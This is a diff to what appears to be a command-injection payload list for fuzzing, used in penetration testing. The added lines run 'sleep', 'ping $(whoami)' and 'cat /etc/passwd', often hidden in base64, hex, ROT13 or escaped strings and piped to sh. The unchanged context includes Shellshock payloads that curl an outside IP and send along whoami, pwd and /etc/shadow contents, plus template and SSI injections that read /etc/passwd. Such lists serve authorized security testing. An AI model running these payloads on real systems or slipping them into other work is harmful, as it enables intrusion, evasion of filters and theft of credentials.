@@ -110,6 +110,40 @@ a|/usr/bin/id
 %0a id %0a
 `id`
 $;/usr/bin/id
+sleep 10
+`sleep 10`
+echo c2xlZXAgMQ== | base64 --decode | sh
+`echo c2xlZXAgMQ== | base64 --decode`
+echo 736c6565702031 | xxd -r -p | sh
+echo 736c6565702031 | /bin/xxd -r -p | sh
+`echo 736c6565702031 | xxd -r -p`
+`echo 736c6565702031 | /bin/xxd -r -p`
+echo fyrrc 1 | tr 'A-Za-z' 'N-ZA-Mn-za-m' | sh
+`echo fyrrc 1 | tr 'A-Za-z' 'N-ZA-Mn-za-m'`
+echo $'\x73\x6c\x65\x65\x70\x20\x31' | sh
+`echo $'\x73\x6c\x65\x65\x70\x20\x31'`
+ping $(whoami)
+echo cGluZyAkKHdob2FtaSk= | base64 --decode | sh
+`echo cGluZyAkKHdob2FtaSk= | base64 --decode`
+echo 70696e6720242877686f616d6929 | xxd -r -p | sh
+echo 70696e6720242877686f616d6929 | /bin/xxd -r -p | sh
+`echo 70696e6720242877686f616d6929 | xxd -r -p`
+`echo 70696e6720242877686f616d6929 | /bin/xxd -r -p`
+echo cvat $(jubnzv) | tr 'A-Za-z' 'N-ZA-Mn-za-m' | sh
+`echo cvat $(jubnzv) | tr 'A-Za-z' 'N-ZA-Mn-za-m'`
+echo $'\x70\x69\x6e\x67\x20\x24\x28\x77\x68\x6f\x61\x6d\x69\x29' | sh
+`echo $'\x70\x69\x6e\x67\x20\x24\x28\x77\x68\x6f\x61\x6d\x69\x29'`
+ping $(id)
+echo cGluZyAkKGlkKQ== | base64 --decode | sh
+`echo cGluZyAkKGlkKQ== | base64 --decode`
+echo 70696e67202428696429 | xxd -r -p | sh
+echo 70696e67202428696429 | /bin/xxd -r -p | sh
+`echo 70696e67202428696429 | xxd -r -p`
+`echo 70696e67202428696429 | /bin/xxd -r -p`
+echo cvat $(vq) | tr 'A-Za-z' 'N-ZA-Mn-za-m' | sh
+`echo cvat $(vq) | tr 'A-Za-z' 'N-ZA-Mn-za-m'`
+echo $'\x70\x69\x6e\x67\x20\x24\x28\x69\x64\x29' | sh
+`echo $'\x70\x69\x6e\x67\x20\x24\x28\x69\x64\x29'`
 () { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\`whoami\`"
 () { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=18?pwd=\`pwd\`"
 () { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=20?shadow=\`grep root /etc/shadow\`"
@@ -134,6 +168,16 @@ $;/usr/bin/id
 cat /etc/hosts
 $(`cat /etc/passwd`)
 cat /etc/passwd
+echo Y2F0IC9ldGMvcGFzc3dk | base64 --decode | sh
+`echo Y2F0IC9ldGMvcGFzc3dk | base64 --decode`
+echo 636174202f6574632f706173737764 | xxd -r -p | sh
+echo 636174202f6574632f706173737764 | /bin/xxd -r -p | sh
+`echo 636174202f6574632f706173737764 | xxd -r -p`
+`echo 636174202f6574632f706173737764 | /bin/xxd -r -p`
+echo png /rgp/cnffjq | tr 'A-Za-z' 'N-ZA-Mn-za-m' | sh
+`echo png /rgp/cnffjq | tr 'A-Za-z' 'N-ZA-Mn-za-m'`
+echo $'\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64' | sh
+`echo $'\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
 %0Acat%20/etc/passwd
 {{ get_user_file("/etc/passwd") }}
 <!--#exec cmd="/bin/cat /etc/passwd"-->
